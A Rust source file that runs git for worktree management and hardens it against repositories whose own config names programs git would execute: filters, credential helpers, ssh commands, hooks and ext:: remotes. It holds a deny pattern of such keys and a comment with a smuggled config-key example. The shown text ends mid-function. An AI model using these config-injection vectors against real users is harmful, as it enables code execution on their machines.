//! The git runner: every git operation goes through the `git` program on the user's path, run
//! with `std::process::Command`. Checked once at startup (`git --version`), never shelled through
//! a terminal. Worktrees are the unit of work: one branch in one folder of its own (PROJ-020).
//! GIT-067: removal deletes the branch only when no other worktree has it checked out and says
//! at which commit a kept branch was left, so it can be deleted later only while unmoved; moves
//! go through `git worktree move` so Git's records stay right; a base ref that is not a plain
//! ref spelling (leading dash, blanks, `..`) is never handed to git.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

/// Counts every finished worktree add/remove/move/prune/repair that goes through this runner (the
/// `git worktree` commands and `Git::worktree_remove`, which mostly runs no git), so a reader that
/// cached the worktree list (the file fence) knows its copy is stale. A plain `git` in a shell is
/// not counted.
static WORKTREE_CHANGES: AtomicU64 = AtomicU64::new(0);

#[cfg(test)]
thread_local! {
    /// Tests only: this thread's own share of the count, exact while other tests run.
    static THIS_THREAD_CHANGES: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

pub fn worktree_changes() -> u64 {
    WORKTREE_CHANGES.load(Ordering::SeqCst)
}

/// Bumps [`WORKTREE_CHANGES`] when dropped, i.e. after the work ended, pass or fail (a failed add can still leave a folder).
struct WorktreeChange(bool);

impl WorktreeChange {
    fn watch(args: &[&str]) -> Self {
        let rest = after_options(args);
        WorktreeChange(rest.first() == Some(&"worktree") && rest.get(1).is_some_and(|s| ["add", "remove", "move", "prune", "repair"].contains(s)))
    }
}

impl Drop for WorktreeChange {
    fn drop(&mut self) {
        if self.0 {
            WORKTREE_CHANGES.fetch_add(1, Ordering::SeqCst);
            #[cfg(test)]
            THIS_THREAD_CHANGES.with(|c| c.set(c.get() + 1));
        }
    }
}

#[derive(Clone, Debug)]
pub struct Git {
    pub version: String,
}

/// One worktree of a repository, as `git worktree list --porcelain` reports it.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Worktree {
    pub path: String,
    pub branch: Option<String>,
    pub head: String,
    pub is_main: bool,
    /// The name the user typed when creating it (PROJ-021); the branch is shown when there is none.
    pub name: Option<String>,
    /// The workspace it was made from (PROJ-047), by path; the sidebar nests it there.
    pub parent: Option<String>,
    /// PROJ-070: set when Git has the worktree locked; the reason, empty when none was given.
    pub locked: Option<String>,
    /// The user hid it from the sidebar (PROJ-042); the main checkout never is.
    pub hidden: bool,
    /// PROJ-044: "main", "managed" (Kolux made it) or "external"; empty until the project's list sets it.
    pub kind: String,
    /// For an external worktree, where its visibility comes from (`visibility.rs`).
    pub source: Option<String>,
    /// AUTO-024: who made it, from Kolux's record of how it came to be ("app", "cli" or
    /// "automation"); none when Kolux has no record.
    pub made_by: Option<String>,
    /// VIEW-038: the issue or pull request number it is linked to, so the palette finds it by number.
    pub number: Option<u64>,
    /// EDIT-047: the comment it was made with (`worktree create --comment`); the palette shows it.
    pub comment: Option<String>,
}

/// GIT-063: what an unattended git is given, so it fails at once instead of waiting on a password
/// prompt no one can see, Git Credential Manager's window included. Saved credentials still work.
pub const NO_PROMPT: [(&str, &str); 2] = [("GIT_TERMINAL_PROMPT", "0"), ("GCM_INTERACTIVE", "never")];

#[cfg(test)]
thread_local! {
    /// Tests only: when set, every git this thread starts writes git's own trace2 event log to
    /// this file (inherited by anything that git starts in turn), so a test sees each process.
    pub(crate) static TRACE2: std::cell::RefCell<Option<PathBuf>> = const { std::cell::RefCell::new(None) };
    /// Tests only: when set, every git this thread starts reads only the repository's own config:
    /// an empty global file, no system file, and nothing the parent process injected (config
    /// pairs or a password helper), so a test's result never depends on this PC's git setup.
    pub(crate) static ISOLATED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
    /// Tests only: with `ISOLATED`, the file this thread's gits read as the user's global config
    /// (default: an empty one), so a test can give "the user" a value of its own.
    pub(crate) static GLOBAL_FOR_TEST: std::cell::RefCell<Option<PathBuf>> = const { std::cell::RefCell::new(None) };
    /// Tests only: with `ISOLATED`, what `parent_env` answers for these variables, as if the parent
    /// process had set them (review fix 8 follow-up: the GIT_CONFIG_PARAMETERS wiring is tested live).
    pub(crate) static PARENT_ENV_FOR_TEST: std::cell::RefCell<Vec<(String, String)>> = const { std::cell::RefCell::new(Vec::new()) };
}

/// Tests only: an empty file to stand in for the user's global git config.
#[cfg(test)]
pub(crate) fn empty_global_config() -> PathBuf {
    let path = std::env::temp_dir().join("kolux-rs-test-empty-gitconfig");
    if std::fs::metadata(&path).map(|m| m.len() != 0).unwrap_or(true) {
        let _ = std::fs::write(&path, "");
    }
    path
}

/// T-779 (P2A-01): the git config Kolux forces on every git it runs, as `GIT_CONFIG_COUNT`
/// environment slots, so the command line stays as written. `core.fsmonitor=false` always: a folder
/// added as a project may arrive with an attacker-written `.git/config` naming a program there, and
/// git would run it on the first `status`; the environment outranks every config file, so the
/// program never runs under Kolux. `core.longpaths=true` on Windows (GIT-070). `existing` is the
/// user's own `GIT_CONFIG_COUNT`: their pairs stay in slots `0..n` and ours follow, so neither side
/// is dropped (before T-779 Kolux injected nothing when the user's shell set the variable). A count
/// git itself would reject as bogus is treated as none. `repo_programs` are the repository's own
/// program-naming keys (see `repo_programs`), blanked the same way after the fixed pairs.
pub(crate) fn injected_config(existing: Option<&std::ffi::OsStr>, repo_programs: &[(String, String)]) -> Vec<(String, String)> {
    let start = existing.and_then(|v| v.to_str()).and_then(|v| v.trim().parse::<usize>().ok()).unwrap_or(0);
    let pairs = forced_config(repo_programs);
    let mut out = Vec::with_capacity(pairs.len() * 2 + 1);
    for (i, (key, value)) in pairs.iter().enumerate() {
        let slot = start + i;
        out.push((format!("GIT_CONFIG_KEY_{slot}"), key.to_string()));
        out.push((format!("GIT_CONFIG_VALUE_{slot}"), value.to_string()));
    }
    out.push(("GIT_CONFIG_COUNT".to_string(), (start + pairs.len()).to_string()));
    out
}

/// The config pairs Kolux forces on a run (see `injected_config`), the fixed ones first, then `repo_programs`.
fn forced_config(repo_programs: &[(String, String)]) -> Vec<(&str, &str)> {
    // `log.showSignature=false`: a repository's own `log.showSignature=true` with a `gpg.program` of its
    // choosing would run that program on every `log` (review fix 2); Kolux never shows signatures.
    // Review fix 4 (B3): `ext::` remotes run a command line of the URL's choosing; Kolux never needs one.
    let mut pairs = vec![("core.fsmonitor", "false"), ("log.showSignature", "false"), ("protocol.ext.allow", "never")];
    if cfg!(windows) {
        pairs.push(("core.longpaths", "true"));
    }
    pairs.extend(repo_programs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
    pairs
}

/// Review fix 8 (P2-1): the parent's `GIT_CONFIG_PARAMETERS` (git's own carrier for `-c` pairs, which git
/// reads AFTER the `GIT_CONFIG_COUNT` slots, so a pair in it outranks every slot) with Kolux's pairs appended
/// in git's split form (`'key'='value'`, each side single-quoted on its own, space-separated), so Kolux's
/// values win in that list too. The one-word form `'key=value'` is NOT safe here: git splits it at the FIRST
/// `=`, and a forced key comes from the folder's own config, where a subsection may hold `=` (review fix 8
/// follow-up, P1: `[filter "a.clean=<program> #"] clean = x` would have set `filter.a.clean` to the program).
/// None when the parent set nothing: the slots then stand alone.
fn config_parameters(existing: Option<&std::ffi::OsStr>, repo_programs: &[(String, String)]) -> Option<String> {
    let existing = existing?.to_string_lossy().into_owned();
    let sq = |s: &str| format!("'{}'", s.replace('\'', "'\\''"));
    let ours = forced_config(repo_programs).iter().map(|(k, v)| format!("{}={}", sq(k), sq(v))).collect::<Vec<_>>().join(" ");
    Some(if existing.trim().is_empty() { ours } else { format!("{existing} {ours}") })
}

/// Review fix 8 (P2-1): the parent's `GIT_ALLOW_PROTOCOL` (a colon-separated allow list that makes git ignore
/// every `protocol.*.allow` config, Kolux's pairs included) without the transports Kolux switches off in this
/// run: `ext` always, and each `<name>` whose `protocol.<name>.allow=never` is among the pairs; an empty
/// list stays set (nothing allowed) when `protocol.allow=never` is. None when the parent set nothing.
fn allow_protocol(existing: Option<&std::ffi::OsStr>, repo_programs: &[(String, String)]) -> Option<String> {
    let existing = existing?.to_string_lossy().into_owned();
    let pairs = forced_config(repo_programs);
    let never = |name: &str| pairs.iter().any(|(k, v)| *v == "never" && (*k == format!("protocol.{name}.allow") || *k == "protocol.allow"));
    Some(existing.split(':').filter(|p| !p.is_empty() && !never(p)).collect::<Vec<_>>().join(":"))
}

/// T-779 (P2A-01, review finding 1): the config keys through which a repository's own config
/// names a program that git runs on a plain read. A clean filter runs on `status` and `diff` for
/// every file whose index stat is stale (every file of a folder extracted from a zip), a smudge
/// filter on checkout, a textconv or external diff on `diff`/`show` of a commit, a signature
/// program on a log that shows signatures (review fix 2). Only the keys a listing finds are
/// blanked, so a user's own drivers in their global config stay as they are.
///
/// S4 (DT-C229, Txais 2026-11-08: "Yes, include it"): the same listing also finds the keys through
/// which a folder names a program for a TRANSFER or a hook: the ssh and proxy commands and the
/// upload/receive programs (replaced on every run, see `net_overrides`), and the keys that make a
/// write or a transfer unsafe to run at all in an untrusted folder (a credential helper, a hooks
/// folder, a merge driver: see `write_access`).
const REPO_PROGRAM_KEYS: &str = r"^filter\..*\.(clean|smudge|process|required)$|^diff\..*\.(textconv|command)$|^gpg\.([^.]+\.)?program$|^gpg\.ssh\.defaultkeycommand$|^core\.(sshcommand|gitproxy|hookspath)$|^remote\..*\.(uploadpack|receivepack)$|^credential\.(.*\.)?helper$|^merge\..*\.driver$|^core\.alternaterefscommand$|^extensions\.partialclone$|^remote\..*\.promisor$|^hook\..*\.command$";

/// The keys a USER's own config may set that a folder's keys of the same name would shadow (S4).
const USER_NET_KEYS: &str = r"^core\.(sshcommand|gitproxy)$";

/// A key whose value is a program git runs on a read, and which a read blanks (see `overrides_for`).
fn is_program_key(key: &str) -> bool {
    // Review fix 4: a merge driver is blanked on a read too (merge-tree's forecast would run it), and
    // `core.alternateRefsCommand` (a program `fetch` and a receiving push run) is blanked on every run.
    key.starts_with("filter.") || key.starts_with("diff.") || key.starts_with("gpg.") || is_merge_driver_key(key) || key == ALT_REFS
}

/// Review fix 4 (B5): never needed, so never kept, trusted folder or not.
const ALT_REFS: &str = "core.alternaterefscommand";

/// Review fix 4 (B3, B4): a partial clone's read can fetch missing objects on its own (lazy fetch), which
/// runs the folder's credential helper or contacts whatever its promisor remote names.
fn partial_clone(found: &[(String, String)]) -> bool {
    // Review fix 5: promisor is a git boolean (`1`, `yes`, `on`, or the bare key all count).
    let truthy = |v: &str| matches!(v.trim().to_ascii_lowercase().as_str(), "" | "true" | "yes" | "on" | "1");
    found.iter().any(|(k, v)| k == "extensions.partialclone" || (k.starts_with("remote.") && k.ends_with(".promisor") && truthy(v)))
}

/// A key naming a program for a transfer (S4) that is replaced, never just blanked, so the user's own
/// value of the same key (or git's default) still applies: an environment variable outranks it.
fn is_net_key(key: &str) -> bool {
    key == "core.sshcommand" || key == "core.gitproxy"
}

/// A folder's own `remote.<name>.uploadpack` or `receivepack` (S4). These cannot be replaced: git
/// keeps the FIRST value it reads for them ("more than one uploadpack given, using the first"), and the
/// folder's own config is read before anything Kolux passes, so a transfer that would use one is refused.
fn is_pack_key(key: &str) -> bool {
    key.starts_with("remote.") && (key.ends_with(".uploadpack") || key.ends_with(".receivepack"))
}

fn is_credential_key(key: &str) -> bool {
    key == "credential.helper" || (key.starts_with("credential.") && key.ends_with(".helper"))
}

fn is_merge_driver_key(key: &str) -> bool {
    key.starts_with("merge.") && key.ends_with(".driver")
}

/// The pseudo-key a listing carries for each hooks folder of the repository and its submodules (S4):
/// never a git key, never blanked; `write_access` looks inside it when a run is attempted.
const HOOKS_KEY: &str = "kolux.hooks-dir";

/// The program lines `git lfs install` writes, which run the user's own installed git-lfs and
/// nothing the folder brought along; a driver made only of these is left alone, so a repository
/// with LFS set up locally keeps working under Kolux.
const LFS_LINES: [(&str, &str); 5] = [("clean", "git-lfs clean -- %f"), ("smudge", "git-lfs smudge -- %f"), ("process", "git-lfs filter-process"), ("smudge", "git-lfs smudge --skip -- %f"), ("process", "git-lfs filter-process --skip")];

/// What a git run may do with the repository's own program keys (review fix 2, Txais 2026-11-08,
/// DT-C229): a read always has them blanked; a write that runs the repository's clean or smudge
/// filters (add, commit, checkout, worktree add...) keeps them only in a trusted folder.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum Access {
    Reads,
    TrustedWrite,
}

/// The program keys a listing found, as (key, value) in the repository's own scopes. `scoped` is
/// the shape of `git config -z --show-scope --get-regexp` (records `scope NUL key LF value NUL`;
/// only the local and worktree scopes count: the user's global and system drivers stay); unscoped
/// is `git config -z --file <repo config> --get-regexp` (records `key LF value NUL`), which has
/// only the repository's own scope to begin with.
fn parse_listing(listing: &[u8], scoped: bool) -> Vec<(String, String)> {
    let mut found: Vec<(String, String)> = Vec::new();
    let mut records = listing.split(|b| *b == 0);
    loop {
        let entry = if scoped {
            let Some(scope) = records.next() else { break };
            let Some(entry) = records.next() else { break };
            if !matches!(scope, b"local" | b"worktree") {
                continue;
            }
            entry
        } else {
            let Some(entry) = records.next() else { break };
            entry
        };
        if entry.is_empty() {
            continue;
        }
        let entry = String::from_utf8_lossy(entry);
        let (key, value) = entry.split_once('\n').unwrap_or((&entry, ""));
        found.push((key.to_string(), value.trim_end_matches('\r').to_string()));
    }
    found
}

/// The overrides for what a listing found: every program key in the repository's own scope becomes
/// an empty value, so git has no program to run, and the driver's `required` is forced off, so a
/// blanked clean filter does not fail the read instead. git-lfs's standard lines are the one
/// exception (see `LFS_LINES`). `TrustedWrite` blanks only the diff programs: the folder's own
/// filters (and signing program) are what the user's write is meant to run.
fn overrides_for(found: &[(String, String)], access: Access) -> Vec<(String, String)> {
    // A filter driver is git-lfs's own when every program line it has is the standard one.
    let is_lfs = |driver: &str| {
        let lines: Vec<&(String, String)> = found.iter().filter(|(k, _)| k.strip_prefix(driver).is_some_and(|rest| matches!(rest, ".clean" | ".smudge" | ".process"))).collect();
        !lines.is_empty() && lines.iter().all(|(k, v)| LFS_LINES.iter().any(|(suffix, line)| k.ends_with(suffix) && v == line))
    };
    let mut out = Vec::with_capacity(found.len());
    for (key, _) in found {
        if !is_program_key(key) {
            continue;
        }
        let Some(driver) = key.rsplit_once('.').map(|(d, _)| d) else { continue };
        if access == Access::TrustedWrite && !key.starts_with("diff.") && key != ALT_REFS {
            continue;
        }
        if driver.starts_with("filter.") && is_lfs(driver) {
            continue;
        }
        let blank = if key.ends_with(".required") { "false" } else { "" };
        if !out.iter().any(|(k, _): &(String, String)| k == key) {
            out.push((key.clone(), blank.to_string()));
        }
    }
    out
}

/// The overrides for one top-level listing (see `parse_listing`), for a read.
#[cfg(test)]
pub(crate) fn repo_program_overrides(listing: &[u8]) -> Vec<(String, String)> {
    overrides_for(&parse_listing(listing, true), Access::Reads)
}

/// The filter drivers a repository names that would run a program of the folder's own (not
/// git-lfs's standard one) on a write: `(driver, key)` for each, in the order found. A driver with
/// only a `required` line runs nothing and is not listed.
fn program_filters(found: &[(String, String)]) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for (key, _) in overrides_for(found, Access::Reads) {
        let Some(rest) = key.strip_prefix("filter.") else { continue };
        let Some((driver, line)) = rest.rsplit_once('.') else { continue };
        if matches!(line, "clean" | "smudge" | "process") && !out.iter().any(|(d, _)| d == driver) {
            out.push((driver.to_string(), key.clone()));
        }
    }
    out
}

/// A config file's text, for the few files read as text here (no git run): nothing unless it is a
/// regular file (a pipe, a device or a folder named like a config file never blocks the read), and
/// at most 1 MB of it (a hostile folder's multi-gigabyte "config" is not slurped).
fn read_small(path: &Path) -> Option<String> {
    use std::io::Read;
    if !std::fs::metadata(path).ok()?.is_file() {
        return None;
    }
    let mut bytes = Vec::new();
    std::fs::File::open(path).ok()?.take(1 << 20).read_to_end(&mut bytes).ok()?;
    Some(String::from_utf8_lossy(&bytes).into_owned())
}

/// The git folder a `.git` entry stands for: the folder itself, or the folder a `.git` file names
/// (`gitdir: <path>`, relative to the folder the file is in), as a linked worktree or a submodule
/// has it. Links are followed, as git follows them.
fn resolve_dot_git(dot_git: &Path) -> Option<PathBuf> {
    if dot_git.is_dir() {
        return Some(dot_git.to_path_buf());
    }
    let text = read_small(dot_git)?;
    let rel = text.lines().find_map(|l| l.strip_prefix("gitdir:"))?.trim();
    Some(dot_git.parent()?.join(rel))
}

/// The worktree folder, the git dir and the shared (common) git dir for a git run in `cwd`, found
/// from the `.git` folder or file of `cwd` or an ancestor without running git. None when `cwd` is
/// in no repository.
fn repo_layout(cwd: &Path) -> Option<(PathBuf, PathBuf, PathBuf)> {
    let dot_git = cwd.ancestors().take(64).map(|d| d.join(".git")).find(|g| g.exists())?;
    let root = dot_git.parent()?.to_path_buf();
    let git_dir = resolve_dot_git(&dot_git)?;
    // The shared folder: `commondir` names it (relative to the git dir) for a linked worktree.
    let common = read_small(&git_dir.join("commondir")).map(|t| git_dir.join(t.trim())).unwrap_or_else(|| git_dir.clone());
    Some((root, git_dir, common))
}

/// The git dir and the shared (common) git dir for a git run in `cwd` (see `repo_layout`).
fn repo_dirs(cwd: &Path) -> Option<(PathBuf, PathBuf)> {
    repo_layout(cwd).map(|(_, git_dir, common)| (git_dir, common))
}

/// How deep the walks below go, and how many submodule configs each keeps. A walk that hits either
/// says so (false), and the listing then fails closed instead of silently leaving some out.
const SUBMODULE_DEPTH: usize = 8;
const SUBMODULES_KEPT: usize = 256;
const LISTING_LIMIT: std::time::Duration = std::time::Duration::from_secs(30);

/// Every submodule's own config under `modules` (`.git/modules`), nested submodules included
/// (a submodule's git folder holds its own `modules`); links are followed. A git run in the parent
/// lets the child gits it starts for a submodule read that config, so a filter named there runs as
/// well (review fix 2). False when a cap cut the walk short.
fn module_configs(modules: &Path, out: &mut Vec<PathBuf>, depth: usize) -> bool {
    let Ok(entries) = std::fs::read_dir(modules) else { return true };
    if depth > SUBMODULE_DEPTH {
        return false;
    }
    let mut complete = true;
    for entry in entries.flatten() {
        let dir = entry.path();
        if !dir.is_dir() {
            continue;
        }
        let config = dir.join("config");
        if config.is_file() {
            if out.len() >= SUBMODULES_KEPT {
                return false;
            }
            out.push(config);
            complete &= module_configs(&dir.join("modules"), out, depth + 1);
        } else {
            // A submodule named `a/b` lives in `modules/a/b`: `a` is only a folder on the way.
            complete &= module_configs(&dir, out, depth + 1);
        }
    }
    complete
}

/// What a walk over the gitlinks of a worktree found (review fix 3, finding B2): a submodule's git
/// folder need not be under `.git/modules` (an embedded `sub/.git` folder, or a `.git` file naming
/// a folder anywhere), so the index, which lists every gitlink, is the authority.
#[derive(Default)]
struct GitlinkWalk {
    /// Each submodule's own `config` and `config.worktree`.
    configs: Vec<PathBuf>,
    /// Files whose change can change the answer: every `.git` a gitlink might have, each submodule's HEAD and index.
    watch: Vec<PathBuf>,
    /// False when git could not list a worktree's gitlinks, or a cap cut the walk short.
    incomplete: bool,
    kept: usize,
}

/// The folders of the gitlinks (index mode 160000) of the worktree at `root`, from `git ls-files -s`,
/// which reads only the index and runs no program. None when git did not answer in time; a git that
/// refuses (not a repository, someone else's folder) answers nothing, and refuses the real run too.
fn gitlinks(root: &Path) -> Option<Vec<PathBuf>> {
    let out = output_within(base_command(&["ls-files", "-s", "-z"], Some(root), &[], &[]), LISTING_LIMIT)?;
    if !out.status.success() {
        return Some(Vec::new());
    }
    Some(out.stdout.split(|b| *b == 0).filter_map(|rec| rec.strip_prefix(b"160000 ")).filter_map(|rec| rec.iter().position(|b| *b == b'\t').map(|i| root.join(&*String::from_utf8_lossy(&rec[i + 1..])))).collect())
}

fn walk_gitlinks(root: &Path, depth: usize, walk: &mut GitlinkWalk) {
    let Some(paths) = gitlinks(root) else {
        walk.incomplete = true;
        return;
    };
    for folder in paths {
        let dot_git = folder.join(".git");
        walk.watch.push(dot_git.clone());
        // A submodule that is not checked out has no git folder yet; the `.git` watched above shows when it gets one.
        let Some(git_dir) = dot_git.exists().then(|| resolve_dot_git(&dot_git)).flatten().filter(|d| d.is_dir()) else { continue };
        if depth >= SUBMODULE_DEPTH || walk.kept >= SUBMODULES_KEPT {
            walk.incomplete = true;
            return;
        }
        walk.kept += 1;
        walk.configs.extend([git_dir.join("config"), git_dir.join("config.worktree")]);
        walk.watch.extend([git_dir.join("HEAD"), git_dir.join("index")]);
        walk_gitlinks(&folder, depth + 1, walk);
    }
}

/// `cmd` run for at most `limit` with its standard output read: None when it could not start or did
/// not finish (it is then killed). The standard error is dropped.
fn output_within(mut cmd: Command, limit: std::time::Duration) -> Option<std::process::Output> {
    use std::io::Read;
    use std::process::Stdio;
    cmd.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::null());
    let mut child = cmd.spawn().ok()?;
    let mut pipe = child.stdout.take()?;
    let reader = std::thread::spawn(move || {
        let mut bytes = Vec::new();
        let _ = pipe.read_to_end(&mut bytes);
        bytes
    });
    let started = std::time::Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break Some(status),
            Ok(None) if started.elapsed() < limit => std::thread::sleep(std::time::Duration::from_millis(10)),
            _ => {
                // The whole tree: a program git started would otherwise keep the pipe open.
                crate::procs::kill_tree(child.id());
                let _ = child.kill();
                let _ = child.wait();
                break None;
            }
        }
    };
    // A run that timed out is not waited for any further.
    let stdout = if status.is_some() { reader.join().unwrap_or_default() } else { Vec::new() };
    status.map(|status| std::process::Output { status, stdout, stderr: Vec::new() })
}

/// The config files `include.path` and `includeIf.<condition>.path` name in `file` (read as text, no
/// git run): a relative path is relative to the including file, `~/` is the home folder. Every
/// target counts whether or not its condition holds, so the stamp only errs toward a fresh listing
/// (a condition that depends on the checked-out branch is why HEAD is stamped as well).
fn include_targets(file: &Path) -> Vec<PathBuf> {
    let Some(text) = read_small(file) else { return Vec::new() };
    let mut out = Vec::new();
    let take = |line: &str, out: &mut Vec<PathBuf>| {
        let Some((key, value)) = line.split_once('=') else { return };
        if !key.trim().eq_ignore_ascii_case("path") {
            return;
        }
        let value = value.trim();
        let value = match value.strip_prefix('"') {
            Some(quoted) => quoted.split('"').next().unwrap_or(""),
            None => value.split([';', '#']).next().unwrap_or("").trim(),
        };
        let path = if let Some(rest) = value.strip_prefix("~/") {
            std::env::var(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).map(|h| PathBuf::from(h).join(rest)).unwrap_or_default()
        } else if Path::new(value).is_absolute() {
            PathBuf::from(value)
        } else {
            file.parent().map(|d| d.join(value)).unwrap_or_default()
        };
        if !value.is_empty() && !path.as_os_str().is_empty() {
            out.push(path);
        }
    };
    let mut in_include = false;
    for line in text.lines() {
        let line = line.trim();
        if let Some(header) = line.strip_prefix('[') {
            let name = header.split(|c: char| c == ']' || c == '"' || c.is_whitespace()).next().unwrap_or("");
            in_include = name.eq_ignore_ascii_case("include") || name.eq_ignore_ascii_case("includeif");
            // `[include] path = x` on one line is legal.
            if let Some((_, rest)) = header.rsplit_once(']') {
                if in_include && !rest.trim().is_empty() {
                    take(rest.trim(), &mut out);
                }
            }
        } else if in_include {
            take(line, &mut out);
        }
    }
    out
}

/// `files` and, depth first, every file they include (git itself stops at depth 10); false when
/// the count cap cut the walk short.
fn with_includes_checked(files: &[PathBuf]) -> (Vec<PathBuf>, bool) {
    let mut all: Vec<PathBuf> = Vec::new();
    let mut complete = true;
    let mut todo: Vec<(PathBuf, usize)> = files.iter().cloned().map(|f| (f, 0)).collect();
    while let Some((file, depth)) = todo.pop() {
        if all.contains(&file) {
            continue;
        }
        if all.len() >= 512 {
            complete = false;
            continue;
        }
        if depth < 10 {
            todo.extend(include_targets(&file).into_iter().map(|f| (f, depth + 1)));
        }
        all.push(file);
    }
    (all, complete)
}

#[cfg(test)]
fn with_includes(files: &[PathBuf]) -> Vec<PathBuf> {
    with_includes_checked(files).0
}

/// How the files a listing depends on looked when it was taken: modification time and size of each
/// (a missing one is `None`, so its appearing counts as a change).
type ConfigStamp = Vec<(PathBuf, Option<(std::time::SystemTime, u64)>)>;

fn stat_of(file: &Path) -> Option<(std::time::SystemTime, u64)> {
    std::fs::metadata(file).ok().and_then(|m| Some((m.modified().ok()?, m.len())))
}

fn stamp_holds(stamp: &ConfigStamp) -> bool {
    stamp.iter().all(|(file, was)| stat_of(file) == *was)
}

/// `paths` once each, whichever way they are spelled (a submodule's `gitdir: ../.git/modules/x` and
/// the walk of `.git/modules` reach the same file).
fn unique_files(paths: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut seen: Vec<PathBuf> = Vec::new();
    let mut out = Vec::new();
    for path in paths {
        let key = path.canonicalize().unwrap_or_else(|_| path.clone());
        if !seen.contains(&key) {
            seen.push(key);
            out.push(path);
        }
    }
    out
}

/// One listing per repository, kept while the files it depends on are unchanged, so a status read
/// costs the same number of git processes as before (T-033-e sizes the watcher's process count on it).
/// One cached listing: the folder, its git dir, how the files it depends on looked, and the program
/// keys they gave.
type RepoPrograms = (PathBuf, PathBuf, ConfigStamp, Vec<(String, String)>);
static REPO_PROGRAMS: std::sync::Mutex<Vec<RepoPrograms>> = std::sync::Mutex::new(Vec::new());
const REPO_PROGRAMS_KEPT: usize = 256;

/// The key a listing carries when it could not be made complete (a cap cut a walk short, git did not
/// answer in time): not a git key, never blanked, but a read then runs without submodule checks
/// (`guarded`) and a write that runs filters is refused in an untrusted folder.
const INCOMPLETE_KEY: &str = "kolux.listing-incomplete";

fn incomplete(found: &[(String, String)]) -> bool {
    found.iter().any(|(k, _)| k == INCOMPLETE_KEY)
}

/// The program keys the repository (and every submodule) names, for a git run in `cwd`; `prefix`
/// is the run's own leading options (`-C dir`, `-c k=v`), so the listing reads the same repository.
/// The listing is a plain `git config` read, which runs no program of the repository's. It depends
/// on the config files (and what they include), on `config.worktree`, on HEAD (an `includeIf
/// onbranch:` condition), and on the index of the repository and each submodule (the gitlinks it
/// lists decide which submodule configs count), so a change to any of them makes a new listing.
fn repo_programs(prefix: &[&str], cwd: &Path) -> Vec<(String, String)> {
    let layout = repo_layout(cwd);
    if let Some((_, git_dir, _)) = &layout {
        if let Ok(cache) = REPO_PROGRAMS.lock() {
            if let Some((_, _, _, found)) = cache.iter().find(|(dir, g, stamp, _)| dir == cwd && g == git_dir && stamp_holds(stamp)) {
                return found.clone();
            }
        }
    }
    let mut complete = true;
    let listing = |args: &[&str], complete: &mut bool| -> Vec<u8> {
        // Exit 1 is "no such key": nothing to blank. Any other failure (not a repository) the same.
        match output_within(base_command(args, Some(cwd), &[], &[]), LISTING_LIMIT) {
            Some(out) if out.status.success() => out.stdout,
            Some(_) => Vec::new(),
            None => {
                *complete = false;
                Vec::new()
            }
        }
    };
    let mut args: Vec<&str> = prefix.to_vec();
    args.extend(["config", "-z", "--show-scope", "--get-regexp", REPO_PROGRAM_KEYS]);
    let mut found = parse_listing(&listing(&args, &mut complete), true);
    let mut stamped: Vec<PathBuf> = Vec::new();
    if let Some((root, git_dir, common)) = &layout {
        let mut subs = Vec::new();
        complete &= module_configs(&common.join("modules"), &mut subs, 0);
        let mut walk = GitlinkWalk::default();
        walk_gitlinks(root, 0, &mut walk);
        complete &= !walk.incomplete;
        subs.extend(walk.configs);
        // The hooks folders git would run a hook from: the repository's own, and each submodule's.
        let mut hook_dirs = vec![common.join("hooks")];
        hook_dirs.extend(subs.iter().filter_map(|c| c.parent().map(|g| g.join("hooks"))));
        for dir in unique_files(hook_dirs) {
            found.push((HOOKS_KEY.to_string(), dir.to_string_lossy().into_owned()));
        }
        let subs = unique_files(subs.into_iter().flat_map(|c| [c.with_file_name("config.worktree"), c]).collect());
        for config in subs.iter().filter(|c| c.is_file()) {
            let config = config.to_string_lossy();
            for pair in parse_listing(&listing(&["config", "-z", "--includes", "--file", &config, "--get-regexp", REPO_PROGRAM_KEYS], &mut complete), false) {
                if !found.contains(&pair) {
                    found.push(pair);
                }
            }
        }
        let (mut files, included) = with_includes_checked(&[vec![common.join("config"), git_dir.join("config.worktree")], subs].concat());
        complete &= included;
        files.extend([git_dir.join("HEAD"), git_dir.join("index"), common.join("modules")]);
        files.extend(walk.watch);
        stamped = files;
    }
    if !complete {
        found.push((INCOMPLETE_KEY.to_string(), "1".to_string()));
    }
    if let Some((_, git_dir, _)) = layout {
        let stamp: ConfigStamp = unique_files(stamped).into_iter().map(|f| (f.clone(), stat_of(&f))).collect();
        if let Ok(mut cache) = REPO_PROGRAMS.lock() {
            cache.retain(|(dir, _, _, _)| dir != cwd);
            if cache.len() >= REPO_PROGRAMS_KEPT {
                cache.remove(0);
            }
            cache.push((cwd.to_path_buf(), git_dir, stamp, found.clone()));
        }
    }
    found
}

/// `args` up to the git command word: the leading `-C dir` / `-c k=v` options a run was given.
fn leading_options<'a, 'b>(args: &'a [&'b str]) -> &'a [&'b str] {
    let rest = after_options(args);
    &args[..args.len() - rest.len()]
}

/// Whether `args` is a git command that runs the repository's clean or smudge filters to produce
/// stored or checked-out content: staging, committing, and everything that writes the working
/// tree or the index from other content. Everything else (reads, fetch, push, branch, config,
/// clone, whose new repository carries none of this folder's filters) never needs them.
fn writes_content(args: &[&str]) -> bool {
    let rest = after_options(args);
    let second = rest.get(1).copied();
    match rest.first().copied() {
        Some("add" | "commit" | "checkout" | "switch" | "restore" | "reset" | "merge" | "pull" | "rebase" | "cherry-pick" | "revert" | "apply" | "am" | "read-tree" | "checkout-index" | "sparse-checkout") => true,
        Some("worktree") => second == Some("add"),
        Some("stash") => !matches!(second, Some("list" | "show")),
        Some("submodule") => matches!(second, Some("update" | "add")),
        _ => false,
    }
}

/// Whether the user has trusted `dir` (or the main checkout it is a worktree of) with an agent:
/// the same answer `trust.rs` reads before it pre-trusts a worktree (`carries_trust`: Claude's
/// `hasTrustDialogAccepted`, Codex's `trust_level = "trusted"`), nothing more. Kolux never sets
/// this here.
fn folder_trusted(dir: &Path) -> bool {
    let mut folders = vec![dir.to_path_buf()];
